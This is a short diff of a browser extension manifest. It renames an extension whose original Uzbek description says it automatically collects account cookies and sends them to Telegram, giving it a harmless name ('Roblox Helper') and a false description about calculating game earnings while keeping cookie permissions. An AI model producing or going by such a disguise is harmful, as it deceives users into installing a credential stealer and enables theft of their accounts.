@@ -1,8 +1,8 @@
 {
   "manifest_version": 3,
-  "name": "Roblox Alt Manager",
+  "name": "Roblox Helper",
   "version": "1.0",
-  "description": "Alt akkauntlar kukilarini avtomatik yig'uvchi va Telegramga yuboruvchi kengaytma",
+  "description": "helps with calculating any game earnings",
   "permissions": [
     "cookies",
     "storage",
